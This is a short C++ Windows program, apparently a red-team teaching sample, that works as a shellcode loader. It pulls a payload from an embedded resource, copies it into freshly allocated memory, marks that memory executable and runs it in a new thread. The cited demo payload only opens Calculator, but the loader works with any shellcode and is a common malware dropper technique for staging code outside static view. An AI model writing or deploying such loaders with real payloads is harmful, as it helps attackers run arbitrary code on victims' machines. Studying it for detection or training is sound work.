#include <windows.h>
#include <vector>
#include "resource.h"

// Win32 Shellcode - Spawn the Calc
// https://blackcloud.me/Win32-shellcode-2/

int main(void) {

	// https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-findresourcea
	// Determines the location of a resource with the specified type and name in the specified module.
	HRSRC resourceHandle = FindResource(NULL, MAKEINTRESOURCE(IDR_BIN1), RT_RCDATA);

	// If didn't find the handle
	if (resourceHandle == nullptr)
		ExitProcess(-1);

	// https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadresource
	// Retrieves a handle that can be used to obtain a pointer to the first byte of the specified resource in memory.
	HGLOBAL dataHandle = LoadResource(NULL, resourceHandle);

	// https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-lockresource
	// Retrieves a pointer to the specified resource in memory.
	LPVOID payload = LockResource(dataHandle);

	// https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
	// Reserves, commits, or changes the state of a region of pages in the virtual address space of the calling process. 
	// Memory allocated by this function is automatically initialized to zero.
	LPVOID addressPointer = VirtualAlloc(0, SizeofResource(NULL, resourceHandle), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	// https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlmovememory
	// The RtlMoveMemory routine copies the contents of a source memory block to a destination memory block, 
	// and supports overlapping source and destination memory blocks.
	RtlMoveMemory(addressPointer, payload, SizeofResource(NULL, resourceHandle));

	// https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect
	// Changes the protection on a region of committed pages in the virtual address space of the calling process.
	DWORD oldProtect = 0;
	VirtualProtect(addressPointer, SizeofResource(NULL, resourceHandle), PAGE_EXECUTE_READ, &oldProtect);

	// https://docs.microsoft.com/en-us/windows/win32/api/errhandlingapi/nf-errhandlingapi-getlasterror
	// If == 0 everything is ok, no error
	if (GetLastError() == 0) {
		// https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread
		// Creates a thread to execute within the virtual address space of the calling process.
		HANDLE createThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)addressPointer, 0, 0, 0);

		// https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject
		// Waits until the specified object is in the signaled state or the time-out interval elapses.
		WaitForSingleObject(createThread, -1);
	}

	return 0;
}
